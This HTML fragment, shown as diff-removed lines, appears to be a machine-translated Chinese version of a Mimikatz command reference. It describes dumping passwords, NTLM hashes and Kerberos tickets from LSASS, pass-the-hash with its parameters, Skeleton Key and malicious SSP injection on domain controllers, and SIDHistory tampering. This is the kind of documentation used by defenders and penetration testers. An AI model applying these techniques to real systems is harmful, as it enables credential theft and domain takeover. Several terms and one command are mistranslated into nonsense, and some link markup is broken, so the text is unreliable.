-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-CompressMe.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-CompressMe.jpg" alt="Mimikatz-MISC-CompressMe"></a></p>
-<p><strong>MISC::Detours</strong> - （<strong>*实验*</strong>）尝试使用类似Detours的钩子枚举所有模块<br><em>需要管理员权限。</em></p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-Detours.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-Detours.png" alt="Mimikatz-MISC-走弯路"></a></p>
-<p><strong>MISC::MemSSP</strong> - 通过使用新SSP在内存中修补LSASS来注入恶意Windows SSP以记录本地经过身份验证的凭据 - 无需重新启动（重新启动会清除memssp Mimikatz注入）。这篇<a href="https://adsecurity.org/?p=1760" target="_blank" rel="noopener">关于Mimikatz SSP的文章描述了内存中的修补以及更持久的SSP技术</a>。<br>需要管理员权限。<a href="https://dl.mandiant.com/EE/library/MIRcon2014/MIRcon_2014_IR_Track_Analysis_of_Malicious_SSP.pdf" target="_blank" rel="noopener">MemSSP上的Mandiant演示文稿</a>[</p>
-<p>](<a href="https://dl.mandiant.com/EE/library/MIRcon2014/MIRcon_2014_IR_Track_Analysis_of_Malicious_SSP.pdf)[![SneakyPersistence-EnableMimiSSP-MemSSP-01](https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-EnableMimiSSP-MemSSP-011.png)](https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-EnableMimiSSP-MemSSP-011.png)[" target="_blank" rel="noopener">https://dl.mandiant.com/EE/library/MIRcon2014/MIRcon_2014_IR_Track_Analysis_of_Malicious_SSP.pdf)[![SneakyPersistence-EnableMimiSSP-MemSSP-01](https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-EnableMimiSSP-MemSSP-011.png)](https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-EnableMimiSSP-MemSSP-011.png)[</a></p>
-<p>](<a href="https://dl.mandiant.com/EE/library/MIRcon2014/MIRcon_2014_IR_Track_Analysis_of_Malicious_SSP.pdf" target="_blank" rel="noopener">https://dl.mandiant.com/EE/library/MIRcon2014/MIRcon_2014_IR_Track_Analysis_of_Malicious_SSP.pdf</a>)</p>
-<p><strong>MISC::MFLT</strong> - 收集有关加载的驱动程序的详细信息，包括驾驶员高度。<br>从Mimikatz v2.1.1开始（11/28/2017）。</p>
-<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Misc-Mflt-01.png" alt="img"></p>
-<p><strong>MISC::Ncroutemon</strong> - Juniper Manager（不带DisableTaskMgr）</p>
-<p><strong>MISC::Regedit</strong> - 注册表编辑器（不带DisableRegistryTools）<br><em>需要管理员权限。</em></p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-Regedit.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-Regedit.jpg" alt="Mimikatz，杂项，注册表编辑器"></a></p>
-<p><a href="https://adsecurity.org/?p=1275" target="_blank" rel="noopener"><strong>MISC::Skeleton</strong></a> - 在域控制器上将Skeleton Key注入LSASS进程。<br><em>需要管理员权限。</em><br>这使得对Skeleton Key修补DC的所有用户身份验证都可以使用“主密码”（也称为Skeleton Keys）以及通常的密码。<br><a href="https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-EnableMimikatzSkeleton.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-EnableMimikatzSkeleton.png" alt="SneakyPersistence-EnableMimikatzSkeleton"></a></p>
-<p><strong>MISC::Taskmgr</strong> - 任务管理器（没有DisableTaskMgr）。<br><em>需要管理员权限。</em><br><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-Taskmgr.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-Taskmgr.jpg" alt="Mimikatz-MISC-Taskmgr"></a></p>
-<p><strong>MISC::Wifi -</strong>不再在MISC中。可能转移到DPAPI：可能包含类似功能的Wifi。</p>
-<p><strong>MISC::WP</strong></p>
-<h4 id="MINESWEEPER"><a href="#MINESWEEPER" class="headerlink" title="MINESWEEPER"></a><strong>MINESWEEPER</strong></h4><p><strong>MINESWEEPER::Infos</strong> - 在扫雷中提供地雷信息</p>
-<h4 id="Net"><a href="#Net" class="headerlink" title="Net"></a><strong><strong>Net</strong></strong></h4><p><strong>NET ::alias</strong></p>
-<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Net-Alias.png" alt="img"></p>
-<p><strong>NET ::group</strong></p>
-<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Net-Group.png" alt="img"></p>
-<p><strong>NET::ServerInfo</strong></p>
-<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Net-ServerInfo.png" alt="img"></p>
-<p><strong>NET::Session</strong></p>
-<p><strong>NET ::share</strong></p>
-<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Net-Share.png" alt="img"></p>
-<p><strong>NET ::stat</strong></p>
-<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Net-Stats.png" alt="img"></p>
-<p><strong>NET::TOD</strong></p>
-<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Net-TOD.png" alt="img"></p>
-<p><strong>NET ::user</strong></p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Net-User.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Net-User.jpg" alt="Mimikatz-NET-用户"></a></p>
-<p><strong>NET::WSession</strong></p>
-<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Net-WSession.png" alt="img"></p>
-<h4 id="PRIVILEGE"><a href="#PRIVILEGE" class="headerlink" title="PRIVILEGE"></a>PRIVILEGE</h4><p><strong>PRIVILEGE ::</strong> <strong>Backup</strong> - 获取备份权限/权限。需要debug权限。</p>
-<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Privilege-Backup.png" alt="img"></p>
-<p><strong>PRIVILEGE::Debug</strong> - 获取debug权限（许多Mimikatz命令需要此权限或本地系统权限）。<br>默认情况下，Administrators组具有“debug”权限。debug仍然必须通过运行“privilege::debug”来“激活”。</p>
-<p><em>debug权限允许某人debug他们本来无法访问的进程。例如，作为用户运行的进程在其令牌上启用了debug权限，可以debug作为本地系统运行的服务。</em><br><em><a href="http://msdn.microsoft.com/library/windows/hardware/ff541528.aspx" target="_blank" rel="noopener">http://msdn.microsoft.com/library/windows/hardware/ff541528.aspx</a></em></p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Privilege-Debug.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Privilege-Debug.png" alt="Mimikatz特权，debug"></a></p>
-<p>本杰明的备注：<br>错误kuhl_m_privilege_simple; RtlAdjustPrivilege（20）c0000061意味着客户端不持有所需的权限（主要是您不是管理员：smirk :)</p>
-<p><strong>PRIVILEGE::Driver</strong> - 获取驱动程序权限/权限。需要debug权限。</p>
-<p><strong>PRIVILEGE::ID</strong> - 按ID获取权限/权限。需要debug权限。</p>
-<p><strong>PRIVILEGE::Name</strong> - 按<strong>名称</strong>获取权限/权限。需要debug权限。</p>
-<p><strong>PRIVILEGE::Restore</strong> - 获取还原权限/权限。需要debug权限。</p>
-<p><strong>PRIVILEGE::Security</strong> - 获取安全权限/权限。需要debug权限。</p>
-<p><strong>PRIVILEGE::SysEnv</strong> - 获取管理系统环境的权限/权限。需要debug权限。</p>
-<p><strong>PRIVILEGE::TCB</strong> - 获取TCB权限/权限（可能作为操作系统权限的一部分）。需要提升权利（仍然是TBD）。</p>
-<h4 id="PROCESS"><a href="#PROCESS" class="headerlink" title="PROCESS"></a><strong>PROCESS</strong></h4><p>Mimikatz PROCESS模块提供了收集进程数据和与进程交互的能力。</p>
-<p><strong>PROCESS::Exports</strong> - 列出导出</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-Exports.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-Exports.jpg" alt="Mimikatz进程-进出口"></a></p>
-<p><strong>PROCESS::Imports</strong> - 列出导入</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-Imports.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-Imports.jpg" alt="Mimikatz进程-进口"></a></p>
-<p><strong>PROCESS::List</strong> - 列出正在运行的进程<br>需要管理员权限。</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-List.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-List.jpg" alt="Mimikatz进程名录"></a></p>
-<p><strong>PROCESS::Resume</strong> - 恢复进程</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-Resume.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-Resume.jpg" alt="Mimikatz进程 - 恢复"></a></p>
-<p><strong>PROCESS::Run</strong>  - Run</p>
-<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Process-Run.png" alt="img"></p>
-<p><strong>PROCESS::Start</strong> – 开始一个过程</p>
-<p><strong>PROCESS::Stop</strong> – - 终止进程</p>
-<p><strong>PROCESS::Suspend</strong> - 暂停进程</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-Suspend.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-Suspend.jpg" alt="Mimikatz进程挂起"></a></p>
-<h4 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a><strong>RPC</strong></h4><p>RPC模块提供mimikatz的远程控制。</p>
-<p><strong>RPC::Close</strong></p>
-<p><strong>RPC::Connect</strong></p>
-<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-RPC-Connect.png" alt="img"></p>
-<p><strong>RPC::Enum</strong></p>
-<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-RPC-Enum.png" alt="img"></p>
-<p><strong>RPC::Server</strong></p>
-<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-RPC-Server.png" alt="img"></p>
-<h4 id="SEKURLSA"><a href="#SEKURLSA" class="headerlink" title="SEKURLSA"></a><strong>SEKURLSA</strong></h4><p>SEKURLSA Mimikatz模块与受保护的内存进行交互。该模块从lsass（本地安全机构子系统服务）的内存中提取密码，密钥，密码，票据。<br>为了与LSASS进行交互，Mimikatz流程需要适当的权利：</p>
-<ul>
-<li>管理员，通过<em>“PRIVILEGE::Debug”</em>获取debug权限</li>
-<li>系统权利（<em>“TOKEN::elevate”）</em></li>
-</ul>
-<p>但是，对于转储的LSASS进程文件（即LSASS.dmp）运行时，不需要提升权限。</p>
-<p><strong>SEKURLSA::Backupkeys</strong> - 获取首选备份主密钥</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-sekurlsa-Backupkeys.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-sekurlsa-Backupkeys.jpg" alt="Mimikatz-sekurlsa-Backupkeys"></a></p>
-<p><strong>SEKURLSA::Credman</strong> - 列出凭据管理器</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-Credman.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-Credman.png" alt="Mimikatz-Sekurlsa-Credman"></a></p>
-<p><strong>SEKURLSA::Dpapi</strong> - 列出缓存的MasterKeys</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-DPAPI.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-DPAPI.png" alt="Mimikatz-Sekurlsa-DPAPI"></a></p>
-<p><strong>SEKURLSA::DpapiSystem</strong> - DPAPI_SYSTEM秘密</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-DPAPISystem.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-DPAPISystem.png" alt="Mimikatz-Sekurlsa-DPAPISystem"></a></p>
-<p><strong>SEKURLSA::Ekeys</strong> - 列出Kerberos加密密钥</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-EKeys.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-EKeys.png" alt="Mimikatz-Sekurlsa-EKeys"></a></p>
-<p><strong>SEKURLSA::Kerberos</strong> - 列出所有经过身份验证的用户（包括服务和计算机帐户）的Kerberos凭据</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-Kerberos.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-Kerberos.png" alt="Mimikatz-Sekurlsa的Kerveros"></a></p>
-<p><strong>SEKURLSA::Krbtgt</strong> - 获取Domain Kerberos服务帐户（KRBTGT）密码数据</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-KrbTGT.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-KrbTGT.png" alt="Mimikatz-Sekurlsa-KRBTGT"></a></p>
-<p><strong>SEKURLSA::LiveSSP</strong> - 列出LiveSSP凭据</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-LiveSSP.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-LiveSSP.png" alt="Mimikatz-Sekurlsa-LiveSSP"></a></p>
-<p><strong>SEKURLSA::LogonPasswords</strong> - 列出所有可用的提供者凭据。这通常显示最近登录的用户和计算机凭据。</p>
-<ul>
-<li>在LSASS中转储当前登录（或最近登录）帐户的密码数据以及在用户凭据上下文中运行的服务。</li>
-<li>帐户密码以可逆方式存储在内存中。如果它们在内存中（在Windows 8.1 / Windows Server 2012 R2之前），则会显示它们。在大多数情况下，Windows 8.1 / Windows Server 2012 R2不以这种方式存储帐户密码。KB2871997将此安全功能“后端”移植到Windows 7，Windows 8，Windows Server 2008R2和Windows Server 2012，但在应用KB2871997后计算机需要其他配置。</li>
-<li>需要管理员访问权限（具有debug权限）或本地系统权限</li>
-</ul>
-<p><strong>Windows Server 2008 R2系统（显示密码）。</strong>                                                </p>
-<p><a href="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-Sekurlsa-logonpasswords-Win10.png" target="_blank" rel="noopener"><img src="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-Sekurlsa-logonpasswords-Win10_thumb.png" alt="Mimikatz-Sekurlsa-logonpasswords-Win2008R2  - 第1部分"></a> </p>
-<p><strong>Windows Server 2012 R2系统 - 未显示明文密码</strong></p>
-<p><a href="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-Sekurlsa-logonpasswords-Win2012R21.png" target="_blank" rel="noopener"><img src="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-Sekurlsa-logonpasswords-Win2012R2_thumb1.png" alt="Mimikatz-Sekurlsa-logonpasswords-Win2012R2"></a></p>
-<p>使用此命令也会转储使用帐户凭据运行的服务。<br>请注意，只能以这种方式转储正在运行的服务（内存中的凭据）。</p>
-<p><a href="http://adsecurity.org/wp-content/uploads/2015/01/WindowsServer2008R2-SQLServices.png" target="_blank" rel="noopener"><img src="http://adsecurity.org/wp-content/uploads/2015/01/WindowsServer2008R2-SQLServices_thumb.png" alt="WindowsServer2008R2，SQLServices"></a></p>
-<p><a href="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-Sekurlsa-logonpasswords-Win2008R2-ServicePasswordDump-Part22.png" target="_blank" rel="noopener"><img src="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-Sekurlsa-logonpasswords-Win2008R2-ServicePasswordDump-Part2_thumb2.png" alt="Mimikatz-Sekurlsa-logonpasswords-Win2008R2-ServicePasswordDump  - 第2部分"></a></p>
-<p><a href="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-Sekurlsa-logonpasswords-Win2008R2-ServicePasswordDump-Part32.png" target="_blank" rel="noopener"><img src="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-Sekurlsa-logonpasswords-Win2008R2-ServicePasswordDump-Part3_thumb2.png" alt="Mimikatz-Sekurlsa-logonpasswords-Win2008R2-ServicePasswordDump，第3部分"></a></p>
-<p><strong>SEKURLSA::Minidump</strong> - 切换到LSASS minidump进程上下文</p>
-<p>转储LSASS有几种不同的方法：   <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump" target="_blank" rel="noopener">procdump</a>，<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1" target="_blank" rel="noopener">PowerShell</a>，任务管理器等。</p>
-<p>请注意，需要使用从NT5 Win32或NT5x64或NT6 Win32或NT6 x64转储的相同平台来读取Minidump。<br><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-Minidump.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-Minidump.png" alt="Mimikatz-Sekurlsa，小型转储"></a></p>
-<p>另一种选择是使用任务管理器转储LSASS进程</p>
-<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Dump-LSASS-With-TaskManager.png" alt="img"></p>
-<p>Sekurlsa::minidump可以打开转储文件。</p>
-<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-sekurlsa-minidump-02.png" alt="img"> <img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-sekurlsa-minidump-01.png" alt="img"></p>
-<p><strong>SEKURLSA::MSV</strong> - 列出LM和NTLM凭证</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-MSV.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-MSV.png" alt="Mimikatz-Sekurlsa-MSV"></a></p>
-<p><strong>SEKURLSA::Process</strong> - 切换到LSASS流程上下文</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-Process.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-Process.png" alt="Mimikatz-Sekurlsa进程"></a></p>
-<p><strong>SEKURLSA::Pth</strong> - 传递哈希和过传哈希（又称传球）。</p>
-<p><em>Mimikatz可以执行众所周知的操作’Pass-The-Hash’来使用用户密码的NTLM哈希而不是真实密码在另一个凭据下运行进程。为此，它启动具有假身份的进程，然后用真实信息（真实密码的NTLM哈希）替换虚假信息（伪密码的NTLM哈希）。</em></p>
-<ul>
-<li>/ user - 您要模拟的用户名，请记住，管理员不是此知名帐户的唯一名称。</li>
-<li>/ domain - 完全限定的域名 - 没有域或在本地用户/ admin的情况下，使用计算机或服务器名称，工作组或其他。</li>
-<li>/ rc4或/ ntlm - 可选 - 用户密码的RC4密钥/ NTLM哈希值。</li>
-<li>/ run - 可选 - 要运行的命令行 - 默认为：cmd有shell。</li>
-</ul>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-PTH.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-PTH.jpg" alt="Mimikatz-Sekurlsa-PTH"></a></p>
-<p>本杰明的备注：</p>
-<ul>
-<li>此命令不适用于minidumps（废话）;</li>
-<li>它需要提升的权限（privilege::debug或SYSTEM帐户），而不像使用一个官方API的“Pass-The-Ticket”;<br>这个新版本的’Pass-The-Hash’用ntlm哈希替换Kerberos的RC4密钥（和/或替换AES密钥） - 它允许Kerberos提供者询问TGT门票！;</li>
-<li>在XP / 2003 / Vista / 2008和7 / 2008r2 / 8/2012 kb2871997之前必须使用ntlm哈希（AES不可用或不可替换）;</li>
-<li>AES密钥只能在8.1 / 2012r2或7 / 2008r2 / 8/2012上用kb2871997替换，在这种情况下，您可以避免使用ntlm哈希。</li>
-</ul>
-<p><a href="http://blog.gentilkiwi.com/securite/mimikatz/overpass-the-hash" target="_blank" rel="noopener">本杰明在立交桥上的帖子</a>。</p>
-<p><strong>SEKURLSA::SSP</strong> - 列出SSP凭据</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-SSP.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-SSP.png" alt="Mimikatz-Sekurlsa-SSP"></a></p>
-<p><strong>SEKURLSA::Tickets</strong> - 列出所有最近通过身份验证的用户的所有可用Kerberos票证，包括在用户帐户和本地计算机的AD计算机帐户下运行的服务。<br>与kerberos::list不同，sekurlsa使用内存读取，不受关键出口限制。sekurlsa可以访问其他会话（用户）的门票。</p>
-<ul>
-<li>/ export - 可选 - 票证以.kirbi文件导出。它们以用户的LUID和组号开头（0 = TGS，1 =客户票（？）和2 = TGT）</li>
-</ul>
-<p>与LSASS的凭证转储类似，使用sekurlsa模块，攻击者可以在系统内存中获取所有Kerberos票证数据，包括属于管理员或服务的数据。<br>如果攻击者破坏了为用户使用后端SQL服务器访问的Kerberos委派配置的Web服务器，则此功能非常有用。这使攻击者能够捕获并重用该服务器上内存中的所有用户票证。</p>
-<p>“kerberos::tickets”mimikatz命令转储当前登录用户的Kerberos票证，不需要提升权限。利用sekurlsa模块从受保护内存（LSASS）读取的功能，可以转储系统上的所有Kerberos票证。</p>
-<p>命令：  <em>mimikatz sekurlsa ::门票退出</em></p>
-<ul>
-<li>转储系统上所有经过身份验证的Kerberos票证。</li>
-<li>需要管理员访问权限（带有debug权限）或本地系统权限</li>
-</ul>
-<p>以下屏幕截图显示了另一个域管理员用户（LukeSkywalker）的转储密码和Kerberos票证（TGS和TGT）。</p>
-<p><a href="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-SekurlsaTickets.png" target="_blank" rel="noopener"><img src="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-SekurlsaTickets_thumb.png" alt="Mimikatz-SekurlsaTickets"></a><a href="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-SekurlsaTickets-Part2-AdminTGT.png" target="_blank" rel="noopener"><img src="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-SekurlsaTickets-Part2-AdminTGT_thumb.png" alt="Mimikatz-SekurlsaTickets  - 第2部分，AdminTGT"></a></p>
-<p>以下屏幕截图显示了另一个管理员（HanSolo）的转储凭据和Kerberos票证（TGS和TGT）。</p>
-<p><a href="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-SekurlsaTickets-Part3-AdminTGT.png" target="_blank" rel="noopener"><img src="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-SekurlsaTickets-Part3-AdminTGT_thumb.png" alt="Mimikatz-SekurlsaTickets-3部分，AdminTGT"></a></p>
-<p>以下屏幕截图显示了SQL服务帐户（svc-SQLDBEngine01）的转储凭据和Kerberos票证（TGS和TGT）。</p>
-<p><a href="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-SekurlsaTickets-Part4-ServiceTGT.png" target="_blank" rel="noopener"><img src="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-SekurlsaTickets-Part4-ServiceTGT_thumb.png" alt="Mimikatz-SekurlsaTickets-4部分，ServiceTGT"></a></p>
-<p><strong>SEKURLSA::Trust</strong> - 获取信任密钥<br><em>（我认为这是不赞成使用lsadump::trust / patch）</em></p>
-<p><strong>SEKURLSA::TSPKG</strong> - 列出TsPkg证书</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-TSPKG.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-TSPKG.png" alt="Mimikatz-Sekurlsa-TSPKG"></a></p>
-<p><strong>SEKURLSA::Wdigest</strong> - 列出WDigest凭据</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-sekurlsa-wdigest.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-sekurlsa-wdigest.jpg" alt="Mimikatz-sekurlsa-wdigest"></a></p>
-<h4 id="-1"><a href="#-1" class="headerlink" title=" "></a> </h4><h4 id="服务"><a href="#服务" class="headerlink" title="服务"></a><strong>服务</strong></h4><p><strong>SERVICE::+</strong>   （加号） - 安装Mimikatz服务（’mimikatzsvc’）</p>
-<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Service-Plus.png" alt="img"></p>
-<p><strong>SERVICE::-</strong>  (minus sign)  - 卸载Mimikatz服务（’mimikatzsvc’）</p>
-<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Service-Minus.png" alt="img"></p>
-<p><strong>SERVICE::List</strong> - 列出服务</p>
-<p><strong>SERVICE::Me</strong></p>
-<p><strong>SERVICE::Preshutdown</strong> - preshutdown服务</p>
-<p><strong>SERVICE::Remove</strong>  删除服务</p>
-<p><strong>SERVICE::Resume</strong> - 恢复服务</p>
-<p><strong>SERVICE::Shutdown</strong> - 关闭服务</p>
-<p><strong>SERVICE::Start</strong>  - 启动服务</p>
-<p><strong>SERVICE::Stop</strong> - 停止服务</p>
-<p><strong>SERVICE::Suspend</strong> - 暂停服务</p>
-<h4 id="SID"><a href="#SID" class="headerlink" title="SID"></a><strong>SID</strong></h4><p>Mimikatz SID模块取代了MISC::AddSID。使用SID::Patch修补ntds服务。</p>
-<p><strong>SID::add</strong> - 将SID添加到对象的SIDHistory</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-add.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-add.png" alt="Mimikatz-SID加"></a></p>
-<p><strong>SID::clear</strong> - 清除对象的SIDHistory</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-clear-query.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-clear-query.png" alt="Mimikatz-SID清晰查询"></a></p>
-<p><strong>SID::lookup</strong> - 名称（/ name）或SID（/ sid）查找</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-Lookup.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-Lookup.png" alt="Mimikatz-SID的查找"></a></p>
-<p><strong>SID::modify</strong> - 修改对象的对象SID</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-Modify.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-Modify.png" alt="Mimikatz-SID-修改"></a></p>
-<p><strong>SID::patch</strong> - 补丁NTDS服务</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-Patch.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-Patch.png" alt="Mimikatz-SID贴片"></a></p>
-<p><strong>SID::query</strong> - 按SID或名称查询对象</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-query.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-query.png" alt="Mimikatz-SID查询"></a></p>
-<h4 id="STANDARD"><a href="#STANDARD" class="headerlink" title="STANDARD"></a><strong>STANDARD</strong></h4><p><strong>STANDARD::Answer</strong>–- 回答生命，宇宙和万物的终极问题。</p>
-<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Standard-Answer.png" alt="img"></p>
-<p><strong>STANDARD::Base64</strong> - 将输出切换到base64输出</p>
-<p><strong>STANDARD::CD</strong> - 更改或显示当前目录</p>
-<p><strong>STANDARD::CLS</strong> - 清除屏幕</p>
-<p><strong>STANDARD::Coffee</strong> - 显示<strong>咖啡</strong>的ASCII图像!</p>
-<p><strong>STANDARD::Exit</strong>–退出Mimikatz</p>
-<p><strong>STANDARD::Hostname</strong>  - 显示系统本地主机</p>
-<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Standard-Hostname.png" alt="img"></p>
-<p><strong>STANDARD::LocalTime</strong>  - 显示系统本地日期和时间（OJ命令）</p>
-<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Standard-LocalTime.png" alt="img"></p>
-<p><strong>STANDARD::Log</strong> - 将Mimikatz数据发送到日志文件</p>
-<p><strong>STANDARD::MarkRus</strong> - 传递哈希信息。<br><em>在Mimikatz 2.1.1中删除</em></p>
-<p><strong>STANDARD::Sleep</strong> - 睡眠时间为毫秒</p>
